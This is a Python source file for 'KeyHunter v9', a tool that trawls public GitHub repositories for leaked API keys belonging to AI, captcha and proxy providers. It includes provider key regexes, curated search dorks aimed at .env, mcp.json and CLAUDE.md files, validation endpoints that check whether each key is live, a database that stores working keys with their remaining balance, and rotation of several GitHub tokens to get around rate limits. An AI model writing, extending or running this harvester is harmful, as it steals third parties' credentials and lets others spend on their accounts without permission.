"""
KeyHunter v9 — hardened fork of eternal_v8.

Fixes vs v8 (see review):
  [CRITICAL]
   1. Bare `except:` → `except Exception as e:` + logging everywhere
   2. SQLite: WAL mode + busy_timeout + write-lock (no more "database is locked")
   3. Docstring now matches reality (depth configurable, no false claims)
   4. mark_scanned() moved to AFTER successful parse (was losing keys on network err)
   5. force_delete: removed shell=True (command-injection hardening)
   6. Token rotation: thread-safe via Lock; dead tokens auto-retired
   7. Overlapping-window scan of git log (no keys cut in half by truncation)
  [RELIABILITY]
   8. Removed dead code: gitleaks paths, WEB_SESSIONS, web_search*
   9. Deduped ENDPOINT_SEARCHES
  10. Unified phase return types: always dict[prov -> set[(key, repo)]]
  11. get_repo_size uses token rotation (was burning main token)
  12. DB migrations via PRAGMA user_version
  13. Graceful shutdown via signal + threading.Event
  14. Exponential backoff on retries
  15. requests.Session pool with keep-alive
  16. Persisted ThreadPoolExecutor (no per-phase churn)
  17. mark_scanned race fixed via UNIQUE + INSERT OR IGNORE
  [QUALITY]
  18. validate() refactored into dispatch dict + small validators
  19. Magic numbers → named CONFIG constants
  20. logging module instead of print (file + console)
  21. Keys masked in stdout (k[:8]...k[-4:])
  22. Cross-check generic via provider "alt_urls"
  23. Config tunables from config.yaml (optional) with defaults
  24. Dead-token cleanup on 401
  25. Windows path/portability: no hardcoded user paths

Env knobs (for testing):
  KEYHUNTER_MAX_CYCLES=N   — stop after N cycles (default: run forever)
  KEYHUNTER_LOG_LEVEL=DEBUG|INFO|WARNING
"""
from __future__ import annotations

import hashlib
import logging
import logging.handlers
import math
import os
import re
import shutil
import signal
import sqlite3
import subprocess
# Portable process-group flag: Windows uses CREATE_NEW_PROCESS_GROUP, POSIX ignores it.
_NEWPG = getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)
import sys
import threading
import time
from collections import Counter, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Dict, Iterable, List, Optional, Set, Tuple

import requests

# --------------------------------------------------------------------------- #
# Paths & config
# --------------------------------------------------------------------------- #
PROJ = Path(__file__).resolve().parent.parent
DB_PATH = PROJ / "data" / "keys.db"
WORKING_FILE = PROJ / "data" / "working_keys.txt"
LOG_DIR = PROJ / "data" / "logs"
CLONE_DIR = PROJ / "data" / "clones"
TOKENS_FILE = PROJ / "gh_tokens.txt"
CONFIG_FILE = PROJ / "config.yaml"

MAX_CYCLES = int(os.environ.get("KEYHUNTER_MAX_CYCLES", "0"))  # 0 = forever
LOG_LEVEL = os.environ.get("KEYHUNTER_LOG_LEVEL", "INFO").upper()

# Tunables (overridable from config.yaml).
CONFIG = {
    "scan_workers": 150,        # raw file download threads
    "api_workers": 200,         # GitHub code-search threads
    "git_workers": 50,          # git clone + log threads
    "validate_workers": 50,     # validation threads
    "git_batch_size": 50,       # repos cloned per cycle
    "git_depth": 50,            # --depth N
    "git_size_limit_kb": 30_000,  # skip repos bigger than this
    "git_log_max_chars": 20_000_000,  # cap git log -p output
    "search_pages": 2,          # REST pages per query
    "cycle_sleep": 1.0,
    "request_timeout": (10, 15),
    "validate_timeout": 30,
}


def _load_yaml_tunables() -> None:
    """Overlay config.yaml tunables onto CONFIG (best-effort)."""
    try:
        import yaml  # type: ignore
    except Exception:
        return
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as fh:
            data = yaml.safe_load(fh) or {}
    except Exception:
        return
    # Map known yaml keys → CONFIG.
    mapping = {
        "scan_workers": ("scan_workers", int),
        "validate_workers": ("validate_workers", int),
    }
    for yaml_key, (cfg_key, cast) in mapping.items():
        if yaml_key in data:
            try:
                CONFIG[cfg_key] = cast(data[yaml_key])
            except Exception:
                pass


_load_yaml_tunables()

# --------------------------------------------------------------------------- #
# Logging
# --------------------------------------------------------------------------- #
LOG_DIR.mkdir(parents=True, exist_ok=True)


def _setup_logging() -> logging.Logger:
    log = logging.getLogger("keyhunter")
    log.setLevel(LOG_LEVEL)
    if log.handlers:
        return log
    fmt = logging.Formatter("%(asctime)s %(levelname)-5s %(message)s",
                            "%H:%M:%S")
    # Rotating file handler — 5 MB x 5 files.
    fh = logging.handlers.RotatingFileHandler(
        LOG_DIR / "eternal_v10.log", maxBytes=5_000_000,
        backupCount=5, encoding="utf-8")
    fh.setFormatter(fmt)
    # Console handler — INFO and above.
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(fmt)
    log.addHandler(fh)
    log.addHandler(ch)
    return log


log = _setup_logging()

# --------------------------------------------------------------------------- #
# Constants
# --------------------------------------------------------------------------- #
SKIP = ['your', 'xxx', 'placeholder', 'example', '000000', 'abcdef',
        '1234567890', 'test', 'aaaaaa', 'changeme', 'sk-xxx', 'key-here',
        'insert', 'none', 'default', 'sample', '11111111', '22222222',
        '33333333', '44444444', '55555555', '66666666', '77777777',
        '88888888', '99999999', 'aaaaaaaa', 'bbbbbbbb', 'cccccccc',
        'dddddddd', 'eeeeeeee', 'ffffffff']

# Max regex match length — used for overlap window when scanning big text.
_MAX_KEY_LEN = 200


def _re(pattern: str, flags: int = 0) -> re.Pattern:
    return re.compile(pattern, flags)


# Providers. Notes:
#   - Disabled providers keep a never-matching regex (kept for history).
#   - "alt_urls" enables generic cross-check: if primary fails, try alternates.
PROVIDERS: Dict[str, dict] = {
    "ZAI": {
        "vars": ["ZHIPU_API_KEY", "Z_AI_API_KEY", "BIGMODEL_API_KEY",
                 "ZHIPUAI_API_KEY", "ZAI_API_KEY", "GLM_API_KEY",
                 "CHATGLM_API_KEY", "ZHIPUAI_KEY", "GLM4_API_KEY",
                 "GLM5_API_KEY", "CHATGLM_KEY", "ZHIPU_KEY", "BIGMODEL_KEY",
                 "Z_AI_KEY", "ZAI_KEY", "BIGMODEL_TOKEN"],
        "regex": _re(r'[a-f0-9]{32}\.[A-Za-z0-9]{10,30}'),
        "test_url": "https://api.z.ai/api/coding/paas/v4/chat/completions",
        "test_model": "glm-5.2",
        "sub_url": "https://api.z.ai/api/biz/subscription/list",
        "quota_url": "https://api.z.ai/api/monitor/usage/quota/limit",
        "zai_coding": True,
    },
    "KIMI": {
        "vars": ["MOONSHOT_API_KEY", "KIMI_API_KEY"],
        "regex": _re(r'sk-[A-Za-z0-9]{40,120}'),
        "test_url": "https://api.moonshot.cn/v1/chat/completions",
        "test_model": "kimi-k2.7-code",
    },
    "SAKANA": {
        "vars": ["SAKANA_API_KEY", "SAKANA_KEY", "FUGU_API_KEY",
                 "FISH_API_KEY", "SAKANA_AI_API_KEY"],
        "regex": _re(r'fish_[a-f0-9]{64}'),
        "test_url": "https://api.sakana.ai/v1/chat/completions",
        "test_model": "fugu-ultra",
    },
    "OPENROUTER": {
        "vars": ["OPENROUTER_API_KEY", "OPENROUTER_KEY", "OR_API_KEY",
                 "OPENROUTER_TOKEN", "OR_TOKEN", "OPEN_ROUTER_API_KEY",
                 "OPENROUTER", "OPEN_ROUTER_KEY"],
        "regex": _re(r'sk-or-[A-Za-z0-9-]{30,80}'),
        "test_url": "https://openrouter.ai/api/v1/chat/completions",
        "test_model": "openai/gpt-4o-mini",
    },
    "DASHSCOPE": {
        "vars": ["DASHSCOPE_API_KEY", "QWEN_API_KEY", "ALIYUN_API_KEY",
                 "ALI_API_KEY", "DASHSCOPE_KEY", "QWEN_KEY", "TONGYI_API_KEY",
                 "ALIBABA_API_KEY", "ALIYUN_DASHSCOPE_API_KEY",
                 "DASHSCOPE_TOKEN", "QWEN_TOKEN",
                 # Alibaba Cloud / Aliyun additional vars
                 "ALIBABACLOUD_API_KEY", "ALIYUN_CLOUD_API_KEY",
                 "ALICLOUD_API_KEY", "ALIYUN_LLM_API_KEY",
                 "ALIBABA_LLM_API_KEY", "ALIBABA_CLOUD_API_KEY",
                 "BAILIAN_API_KEY", "BAILIAN_API_TOKEN",
                 "QWEN_DASHSCOPE_API_KEY", "TONGYI_QIANWEN_API_KEY",
                 "QIANWEN_API_KEY", "QWEN2_API_KEY", "QWEN2_5_API_KEY",
                 "DASHSCOPE_API_TOKEN", "ALIYUN_QWEN_API_KEY",
                 "ALIBABA_QWEN_API_KEY", "MODELSCOPE_API_KEY",
                 "MODELSCOPE_TOKEN", "DASHSCOPE_LLM_API_KEY"],
        "regex": _re(r'sk-[a-f0-9]{32}'),
        "test_url": "https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions",
        "test_model": "qwen3.7-max",
        # Cross-check: same regex shape as DeepSeek.
        "alt_urls": [
            ("DEEPSEEK", "https://api.deepseek.com/v1/chat/completions",
             "deepseek-chat"),
        ],
    },
    "MINIMAX": {
        "vars": [],
        "regex": _re(r'NEVER_MATCH_DISABLED_minimax_jwt'),
        "test_url": "https://api.minimaxi.chat/v1/text/chatcompletion_v2",
        "test_model": "MiniMax-Text-01",
        "check_body": True,
    },
    "DEEPSEEK": {
        "vars": ["DEEPSEEK_API_KEY", "DEEPSEEK_KEY", "DS_API_KEY",
                 "DEEPSEEK_TOKEN", "DEEPSEEK_ACCESS_TOKEN", "DEEPSEEK_SECRET",
                 "DEEPSEEK_API_SECRET", "DEEPSEEK_CHAT_API_KEY",
                 "DEEPSEEK_V3_API_KEY", "DEEPSEEK_V4_API_KEY",
                 "DEEPSEEK_PRO_API_KEY", "DEEPSEEK_CODER_API_KEY",
                 "DEEPSEEK_REASONER_API_KEY", "DEEPSEEK_R1_API_KEY"],
        "regex": _re(r'sk-[a-f0-9]{32}'),
        "test_url": "https://api.deepseek.com/v1/chat/completions",
        "test_model": "deepseek-v4",
        "alt_urls": [
            ("DASHSCOPE",
             "https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions",
             "qwen-max"),
        ],
    },
    "TWOCAPTCHA": {
        "vars": ["TWOCAPTCHA_API_KEY", "2CAPTCHA_API_KEY", "2CAPTCHA_KEY",
                 "2CAPTCHA_TOKEN", "RUCAPTCHA_API_KEY", "RUCAPTCHA_KEY",
                 "CAPTCHA_API_KEY", "CAPTCHA_KEY", "CAPTCHA_TOKEN",
                 "TWO_CAPTCHA_KEY", "TWO_CAPTCHA_API_KEY"],
        "regex": _re(r'(?:2captcha|rucaptcha|twocaptcha|two_captcha)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([a-zA-Z0-9]{32})',
                     re.IGNORECASE),
        "test_url": "https://2captcha.com/res.php",
        "validation_type": "captcha_get",
    },
    "CAPSOLVER": {
        "vars": [],
        "regex": _re(r'(?:capsolver|cap_solver)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?(CAP-[A-Za-z0-9_-]{20,45})',
                     re.IGNORECASE),
        "test_url": "https://api.capsolver.com/getBalance",
        "validation_type": "captcha_post",
    },
    "ANTICAPTCHA": {
        "vars": [],
        "regex": _re(r'(?:anticaptcha|anti_captcha)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([a-f0-9]{32})',
                     re.IGNORECASE),
        "test_url": "https://api.anti-captcha.com/getBalance",
        "validation_type": "captcha_post",
    },
    "WEBSHARE": {
        "vars": [],
        "regex": _re(r'(?:webshare)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})',
                     re.IGNORECASE),
        "test_url": "https://proxy.webshare.io/api/v2/proxy/list/",
        "validation_type": "webshare",
    },
    "IPROYAL": {
        "vars": [],
        "regex": _re(r'(?:iproyal|ip_royal)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([a-zA-Z0-9_-]{20,50})',
                     re.IGNORECASE),
        "test_url": "https://api.iproyal.com/v1/balance",
        "validation_type": "iproyal",
    },
    "BRIGHTDATA": {
        "vars": [],
        "regex": _re(r'(?:brightdata|luminati|brd)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([a-f0-9]{32})',
                     re.IGNORECASE),
        "test_url": "https://api.brightdata.com/zone/get_active_zone",
        "validation_type": "brightdata",
    },
    "TELEGRAM": {
        # Disabled: regex never matches. Validator kept for re-enable.
        "vars": [],
        "regex": _re(r'NEVER_MATCH_DISABLED_xxxxxxxxxxxx'),
        "test_url": "",
        "validation_type": "telegram",
    },
    "DISCORD": {
        "vars": [],
        "regex": _re(r'DISABLED_NEVER_MATCH_xxxxxxxxxxxx'),
        "test_url": "",
        "validation_type": "discord",
    },
    "OPENAI": {
        "vars": [],
        "regex": _re(r'DISABLED_BANNED_BY_GITHUB_openai'),
        "test_url": "",
    },
    "ANTHROPIC": {
        "vars": [],
        "regex": _re(r'DISABLED_BANNED_BY_GITHUB_anthropic'),
        "test_url": "",
    },
    "GOOGLE": {
        "vars": [],
        "regex": _re(r'DISABLED_BANNED_BY_GITHUB_google'),
        "test_url": "",
    },
    "TOGETHER": {
        "vars": ["TOGETHER_API_KEY", "TOGETHER_KEY", "TOGETHER_AI_KEY",
                 "TOGETHER_AI_API_KEY"],
        "regex": _re(r'NEVER_MATCH_DISABLED_together'),
        "test_url": "https://api.together.xyz/v1/chat/completions",
        "test_model": "MiniMaxAI/MiniMax-M3",
    },
    "REPLICATE": {
        "vars": ["REPLICATE_API_TOKEN", "REPLICATE_TOKEN",
                 "REPLICATE_API_KEY", "REPLICATE_KEY"],
        "regex": _re(r'r8_[A-Za-z0-9]{37}'),
        "test_url": "https://api.replicate.com/v1/account",
        "validation_type": "replicate",
    },
    "SILICONFLOW": {
        "vars": [],
        "regex": _re(r'sk-[a-zA-Z0-9]{48}'),
        "test_url": "https://api.siliconflow.cn/v1/chat/completions",
        "test_model": "deepseek-ai/DeepSeek-V3",
    },
    "FIREWORKS": {
        # Fireworks AI keys: ~50-char base62. Context-regex only (after var name).
        "vars": ["FIREWORKS_API_KEY", "FIREWORKS_KEY", "FIREWORKS_TOKEN",
                 "FIREWORKS_API_TOKEN"],
        "regex": _re(r'(?:fireworks|FIREWORKS)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([A-Za-z0-9]{48,52})',
                     re.IGNORECASE),
        "test_url": "https://api.fireworks.ai/inference/v1/chat/completions",
        "test_model": "accounts/fireworks/models/llama-v3p1-405b-instruct",
        "balance_url": "https://api.fireworks.ai/v1/account",
    },
    "GROQ": {
        # DISABLED by operator request (free junk).
        "vars": [],
        "regex": _re(r'NEVER_MATCH_DISABLED_groq'),
        "test_url": "https://api.groq.com/openai/v1/chat/completions",
        "test_model": "llama-3.3-70b-versatile",
    },
    "MISTRAL": {
        # DISABLED by operator request.
        "vars": [],
        "regex": _re(r'NEVER_MATCH_DISABLED_mistral'),
        "test_url": "https://api.mistral.ai/v1/chat/completions",
        "test_model": "mistral-large-latest",
    },
    "COHERE": {
        # Cohere — key format: 40-char base64.
        "vars": [],
        "regex": _re(r'(?:cohere|COHERE)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([A-Za-z0-9]{40})',
                     re.IGNORECASE),
        "test_url": "https://api.cohere.ai/v1/chat",
        "test_model": "command-r-plus",
    },
    "NOVITA": {
        # Novita AI — key format: 32-char base64.
        "vars": [],
        "regex": _re(r'(?:novita|NOVITA)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([A-Za-z0-9_-]{32,40})',
                     re.IGNORECASE),
        "test_url": "https://api.novita.ai/v3/openai/chat/completions",
        "test_model": "anthropic/claude-3.5-sonnet",
    },
    "PERPLEXITY": {
        # Perplexity — key format: pplx- + 56 alnum.
        "vars": ["PERPLEXITY_API_KEY", "PPLX_API_KEY", "PERPLEXITY_KEY",
                 "PPLX_KEY", "PERPLEXITY_TOKEN"],
        "regex": _re(r'pplx-[a-z0-9]{56}'),
        "test_url": "https://api.perplexity.ai/chat/completions",
        "test_model": "llama-3.1-sonar-large-128k-online",
    },
    "ELEVENLABS": {
        # ElevenLabs (TTS) — key format: 32-char hex.
        "vars": [],
        "regex": _re(r'(?:elevenlabs|ELEVENLABS|xi)[_a-z]{0,15}["\']?\s*[=:]\s*["\']?([a-f0-9]{32})',
                     re.IGNORECASE),
        "test_url": "https://api.elevenlabs.io/v1/user",
        "validation_type": "elevenlabs",
    },
    "STABILITY": {
        # Stability AI — key format: sk- + 99 alnum.
        "vars": ["STABILITY_API_KEY", "STABILITY_KEY", "STABILITY_TOKEN",
                 "STABLE_DIFFUSION_API_KEY"],
        "regex": _re(r'sk-[A-Za-z0-9]{99}'),
        "test_url": "https://api.stability.ai/v1/user/balance",
        "validation_type": "stability",
    },
    "ALIYUN": {
        # Alibaba Cloud AccessKey (LTAI prefix) — NOT DASHSCOPE! General RAM.
        # Key ID format: LTAI5t... (24 chars after LTAI prefix).
        # Secret: 30-char base64. We catch the ID; secret is separate.
        "vars": [],
        "regex": _re(r'LTAI[A-Za-z0-9]{12,20}'),
        "test_url": "",
        "validation_type": "aliyun",
    },
    "NVIDIA": {
        # NVIDIA NIM — nvapi- prefix + 104 chars.
        "vars": ["NVIDIA_API_KEY", "NIM_API_KEY", "NVIDIA_KEY",
                 "NVIDIA_BUILD_API_KEY"],
        "regex": _re(r'nvapi-[A-Za-z0-9_-]{80,120}'),
        "test_url": "https://integrate.api.nvidia.com/v1/chat/completions",
        "test_model": "meta/llama-3.3-70b-instruct",
    },
}

# Endpoint searches — deduped at import time, order preserved.
ENDPOINT_SEARCHES = list(dict.fromkeys([
    "api.z.ai/api/coding/paas/v4",
    "open.bigmodel.cn/api/paas/v4",
    "api.z.ai/api/paas/v4",
    "api.moonshot.cn",
    "api.sakana.ai",
    "sakana.ai/v1",
    "openrouter.ai/api/v1",
    "api.siliconflow.cn",
    "dashscope.aliyuncs.com",
    "api.deepseek.com",
    "deepseek-chat",
    "deepseek-coder",
    "deepseek.com/v1",
    "platform.deepseek.com",
    "api.together.xyz",
    "api.groq.com",
    "api.fireworks.ai/inference",
    "api.novita.ai",
    "api.mistral.ai",
    "api.cohere.ai",
    "api.together.ai",
    "generativelanguage.googleapis.com",
    "api.anthropic.com",
    "api.openai.com",
    "2captcha.com/res.php",
    "rucaptcha.com/res.php",
    "api.capsolver.com",
    "proxy.webshare.io",
    "api.iproyal.com",
    "api.brightdata.com",
    "discord.com/api",
    "api.telegram.org",
    "t.me/bot",
    "python-telegram-bot",
    "telebot",
    "aiogram",
    "pyTelegramBotAPI",
    "telegraf",
    "node-telegram-bot-api",
    "grammy",
    "Telethon",
    "pyrogram",
    "api.replicate.com",
    "replicate.com/v1",
    "bigmodel.cn",
    "chatglm.cn",
    "open.bigmodel.cn",
    "api.elevenlabs.io",
    "elevenlabs.io",
    "api.jina.ai",
    "api.stability.ai",
    "api.perplexity.ai",
    "makersuite.google.com",
    "ai.google.dev",
    "DASHSCOPE_API_KEY",
    "ZHIPU_API_KEY",
    "glm-5.2",
    "glm-4.6",
    "qwen3.7-max",
    "qwen-max",
    "kimi-k2.7",
    "deepseek-v4",
    "minimax-m3",
    "fugu-ultra",
    "chatglm",
    "bigmodel",
    "zhipuai",
    "dashscope",
    "moonshotai",
    "moonshot-ai",
    "siliconflow",
    "together-ai",
    "together.ai",
    "openrouter",
    "2captcha",
    "anticaptcha",
    "capsolver",
    "replicate",
    "sakana-ai",
    "elevenlabs",
    "stability-ai",
    "jina-ai",
    "api.fireworks.ai",
    "fireworks.ai/inference",
    "FIREWORKS_API_KEY",
    # New sources — alternative platforms where keys leak
    "huggingface.co/spaces",
    "colab.research.google",
    "kaggle.com",
    "replit.com",
    "deepnote.com",
    "streamlit.io",
    "gradio.app",
    # New providers
    "api.groq.com",
    "groq.com",
    "api.mistral.ai",
    "mistral.ai",
    "api.cohere.ai",
    "cohere.com",
    "api.novita.ai",
    "novita.ai",
    "api.perplexity.ai",
    "perplexity.ai",
    "api.elevenlabs.io",
    "elevenlabs.io",
    "api.stability.ai",
    "stability.ai",
    "integrate.api.nvidia.com",
    "nvapi-",
    "GROQ_API_KEY",
    "MISTRAL_API_KEY",
    "COHERE_API_KEY",
    "PERPLEXITY_API_KEY",
    "ELEVENLABS_API_KEY",
    "NVIDIA_API_KEY",
    "ALIBABA_ACCESS_KEY_ID",
    "ALIYUN_ACCESS_KEY",
]))

EXTS = ['env', 'env.local', 'env.production', 'env.example', 'env.dev',
        'env.staging', 'env.test', 'env.config',
        'py', 'js', 'ts', 'json', 'yaml', 'yml',
        'Procfile', 'Dockerfile', 'conf', 'cfg',
        'ipynb', 'toml', 'ini', 'xml', 'gradle', 'properties',
        'sh', 'bash', 'zsh', 'fish']

# High-yield extensions — measured to return >50 results per query.
# Using only these cuts the query matrix ~4x with ~99% key coverage.
# .env / .env.example catch committed secrets; .py/.ts/.js catch code that
# reads them; .json catches config. Everything else returns 403 or <10.
HIGH_YIELD_EXTS = ['env', 'env.example', 'py', 'js', 'ts', 'json']

# TOP_FILENAMES — specific files where keys are MASSIVELY committed.
# Data-driven (from 198K scanned files): these filenames hold ~80% of keys.
# Searching by filename is FAR more precise than by extension.
TOP_FILENAMES = [
    '.env',                    # 3809 hits — committed by mistake
    '.env.example',            # 13612 hits — universal standard
    '.env.production',         # 1039 hits — real prod secrets
    '.env.local',              # 727 hits
    'docker-compose.yml',      # 3051 hits — hardcoded for "simplicity"
    'README.md',               # 4491 hits — people paste keys in docs (!)
    'render.yaml',             # 1497 hits — deploy configs
    'main.py',                 # 708 hits — hardcoded in entrypoint
    'app.py',                  # 675 hits — Flask/Flask apps
    'config.py',               # 544 hits — config files
    # VIBE CODER files — AI coding assistants with hardcoded keys
    'CLAUDE.md',               # 449 files — Claude Code project config
    'mcp.json',                # 444 files — MCP server config (has API keys!)
    '.cursorrules',            # Cursor IDE rules (keys for AI)
    '.windsurfrules',          # Windsurf IDE config
    '.aider.conf.yml',         # Aider AI coding assistant
    'COPILOT_INSTRUCTIONS.md', # GitHub Copilot instructions
    '.continue/config.json',   # Continue IDE plugin
    'opencode.json',           # OpenCode AI config
]

# NEW SOURCES — extra search contexts for phase_search.
# Google Colab notebooks (1150 OpenRouter + 472 DeepSeek + 316 DASHSCOPE hits!)
# Kaggle kernels, Replit, Deepnote — alternative dev platforms.
EXTRA_CONTEXTS = [
    'colab.research.google',
    'kaggle.com',
    'replit.com',
    'deepnote.com',
    'notebook',
    'tutorial',
]

# CURATED DORKS — hand-picked high-yield search queries (v10).
# Adapted from win3zz/leaked-api-keys gist + custom AI-provider dorks.
# Used every 5th cycle to catch patterns that filename-search misses.
CURATED_DORKS = [
    # Hardcoded JSON values (not env vars)
    '"api_key": "sk-" extension:json',
    '"apiKey": "sk-" extension:json',
    '"authorization": "Bearer sk-" extension:py',
    '"Authorization": "Bearer sk-" extension:js',
    # Docker/CI configs with real secrets
    'OPENROUTER_API_KEY filename:docker-compose.yml',
    'DASHSCOPE_API_KEY filename:docker-compose.yml',
    'ZHIPU_API_KEY filename:render.yaml',
    # Colab notebooks (1150+ OpenRouter hits measured)
    'OPENROUTER_API_KEY "colab.research.google"',
    'DASHSCOPE_API_KEY "colab.research.google"',
    'DEEPSEEK_API_KEY "colab.research.google"',
    'ZHIPU_API_KEY "colab.research.google"',
    # Streamlit/Gradio apps (common leak vector)
    'DASHSCOPE_API_KEY "streamlit"',
    'OPENROUTER_API_KEY "gradio"',
    # Config files
    'DASHSCOPE_API_KEY filename:config.json',
    'ZHIPU_API_KEY filename:settings.json',
    # VIBE CODER configs — AI coding assistants with keys
    'DEEPSEEK_API_KEY filename:CLAUDE.md',
    'OPENROUTER_API_KEY filename:mcp.json',
    'DASHSCOPE_API_KEY filename:.cursorrules',
    'DEEPSEEK_API_KEY filename:.aider.conf.yml',
    'OPENROUTER_API_KEY filename:opencode.json',
    '"deepseek" "api_key" filename:mcp.json',
    '"openrouter" "apiKey" filename:CLAUDE.md',
    # DeepSeek specific
    'DEEPSEEK_API_KEY sk- extension:.env',
    'DEEPSEEK_API_KEY sk- extension:.py',
    'DEEPSEEK_API_KEY sk- extension:.js',
]

# --------------------------------------------------------------------------- #
# Graceful shutdown
# --------------------------------------------------------------------------- #
_STOP = threading.Event()


def _on_signal(signum, _frame):
    log.warning("Signal %s received — shutting down after current tasks",
                signum)
    _STOP.set()


for _sig in (signal.SIGINT, signal.SIGTERM):
    try:
        signal.signal(_sig, _on_signal)
    except (ValueError, OSError):
        # Not in main thread (e.g. under tests).
        pass


def _stopped() -> bool:
    return _STOP.is_set()

# --------------------------------------------------------------------------- #
# DB layer — WAL + write-lock + migrations
# --------------------------------------------------------------------------- #
_DB_LOCK = threading.Lock()
_DB_VERSION = 1


def _connect() -> sqlite3.Connection:
    c = sqlite3.connect(str(DB_PATH), timeout=30)
    c.execute("PRAGMA journal_mode=WAL")
    c.execute("PRAGMA busy_timeout=30000")
    c.execute("PRAGMA synchronous=NORMAL")
    return c


def db_init() -> None:
    DB_PATH.parent.mkdir(parents=True, exist_ok=True)
    CLONE_DIR.mkdir(parents=True, exist_ok=True)
    with _DB_LOCK:
        c = _connect()
        try:
            c.execute('''CREATE TABLE IF NOT EXISTS keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                hash TEXT UNIQUE,
                val TEXT, prov TEXT, status TEXT DEFAULT "NEW",
                plan TEXT, price TEXT, remaining TEXT,
                found TEXT, repo TEXT)''')
            c.execute('''CREATE TABLE IF NOT EXISTS scanned_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                file_hash TEXT UNIQUE, repo TEXT, path TEXT, scanned TEXT)''')
            c.execute('''CREATE TABLE IF NOT EXISTS git_scanned (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                repo TEXT UNIQUE, scanned TEXT)''')
            c.execute('''CREATE TABLE IF NOT EXISTS known_repos (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                repo TEXT UNIQUE, source TEXT)''')
            c.execute("PRAGMA user_version")
            cur = c.execute("PRAGMA user_version").fetchone()
            ver = cur[0] if cur else 0
            if ver < _DB_VERSION:
                # Indexes for query performance.
                c.execute("CREATE INDEX IF NOT EXISTS idx_keys_status "
                          "ON keys(status)")
                c.execute("CREATE INDEX IF NOT EXISTS idx_keys_val "
                          "ON keys(val)")
                c.execute("CREATE INDEX IF NOT EXISTS idx_scanned_hash "
                          "ON scanned_files(file_hash)")
                c.execute(f"PRAGMA user_version = {_DB_VERSION}")
            c.commit()
        finally:
            c.close()


def db_add_key(k: str, prov: str, repo: str = "") -> bool:
    h = hashlib.sha256(k.encode()).hexdigest()
    with _DB_LOCK:
        c = _connect()
        try:
            c.execute(
                'INSERT OR IGNORE INTO keys '
                '(hash,val,prov,status,found,repo) VALUES (?,?,?,?,?,?)',
                (h, k, prov, "NEW", datetime.now().isoformat(), repo))
            c.commit()
            return c.total_changes > 0
        except Exception as e:
            log.debug("db_add_key error: %r", e)
            return False
        finally:
            c.close()


def db_update_key(k: str, status: str, plan: str = "", price: str = "",
                  remaining: str = "") -> None:
    with _DB_LOCK:
        c = _connect()
        try:
            c.execute(
                'UPDATE keys SET status=?,plan=?,price=?,remaining=? '
                'WHERE val=?', (status, plan, price, remaining, k))
            c.commit()
        except Exception as e:
            log.debug("db_update_key error: %r", e)
        finally:
            c.close()


def add_known_repo(repo: str, source: str = "") -> None:
    with _DB_LOCK:
        c = _connect()
        try:
            c.execute(
                "INSERT OR IGNORE INTO known_repos (repo,source) VALUES (?,?)",
                (repo, source))
            c.commit()
        except Exception as e:
            log.debug("add_known_repo error: %r", e)
        finally:
            c.close()


def file_hash(repo: str, path: str) -> str:
    return hashlib.sha256(f"{repo}/{path}".encode()).hexdigest()


def is_scanned(repo: str, path: str) -> bool:
    h = file_hash(repo, path)
    c = _connect()
    try:
        r = c.execute("SELECT 1 FROM scanned_files WHERE file_hash=?",
                      (h,)).fetchone()
        return r is not None
    finally:
        c.close()


def mark_scanned(repo: str, path: str) -> None:
    """Mark file scanned. INSERT OR IGNORE — race-safe under UNIQUE."""
    h = file_hash(repo, path)
    with _DB_LOCK:
        c = _connect()
        try:
            c.execute(
                "INSERT OR IGNORE INTO scanned_files "
                "(file_hash,repo,path,scanned) VALUES (?,?,?,?)",
                (h, repo, path, datetime.now().isoformat()))
            c.commit()
        except Exception as e:
            log.debug("mark_scanned error: %r", e)
        finally:
            c.close()


def save_working(key: str, prov: str, plan: str, price: str,
                 remaining: str) -> None:
    line = (f"{datetime.now().isoformat()} | {prov} | {key} | "
            f"{plan} | ${price} | remaining={remaining}\n")
    with _DB_LOCK:
        with open(WORKING_FILE, "a", encoding="utf-8") as f:
            f.write(line)


def mask(key: str) -> str:
    """Mask key for stdout/logs: show first 8 + last 4."""
    if len(key) <= 14:
        return key[:4] + "..." + key[-2:]
    return key[:8] + "..." + key[-4:]

# --------------------------------------------------------------------------- #
# Token management — thread-safe rotation + dead-token retirement
# --------------------------------------------------------------------------- #
class TokenPool:
    def __init__(self) -> None:
        self.tokens: List[str] = []
        self.dead: Set[str] = set()
        self._idx = 0
        self._lock = threading.Lock()
        self._load()

    def _load(self) -> None:
        # Primary token from gh CLI.
        try:
            r = subprocess.run(['gh', 'auth', 'token'], capture_output=True,
                               text=True, timeout=5)
            tok = r.stdout.strip()
            if tok:
                self.tokens.append(tok)
        except Exception:
            pass
        # Extra PATs.
        try:
            with open(TOKENS_FILE, "r", encoding="utf-8") as f:
                for line in f:
                    t = line.strip()
                    if t.startswith("ghp_") and t not in self.tokens:
                        self.tokens.append(t)
        except Exception:
            pass
        if not self.tokens:
            log.warning("No GitHub tokens found — searches will be limited.")

    def next(self) -> str:
        with self._lock:
            live = [t for t in self.tokens if t not in self.dead]
            if not live:
                return ""
            t = live[self._idx % len(live)]
            self._idx += 1
            return t

    def mark_dead(self, token: str) -> None:
        with self._lock:
            self.dead.add(token)
        log.warning("Token retired (401/invalid): %s", mask(token))

    def count(self) -> int:
        with self._lock:
            return len([t for t in self.tokens if t not in self.dead])


TOKENS = TokenPool()

# --------------------------------------------------------------------------- #
# Web sessions — bypass API rate limit via cookie-authed browser sessions
